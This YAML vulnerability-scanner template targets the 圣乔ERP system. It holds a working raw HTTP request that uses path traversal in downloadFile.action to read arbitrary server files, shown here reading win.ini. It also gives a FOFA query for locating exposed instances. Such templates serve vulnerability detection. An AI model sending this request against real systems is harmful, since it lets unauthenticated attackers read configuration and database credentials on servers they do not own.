http:
    - matchers:
        - part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9
          Connection: close
id: shengqiaoERP-downloadFile_action-File-reading
info:
    author: Superhero
    description: |-
        fofa: title="圣乔ERP系统"
        圣乔ERP系统 downloadFile.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 圣乔ERP系统 downloadFile.action 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/n4R95MCMo1ltDLNE1Vk1GQ?token=1192656222&lang=zh_CN
    severity: high
    tags:
        - File reading
        - 圣乔ERP
        - WAP
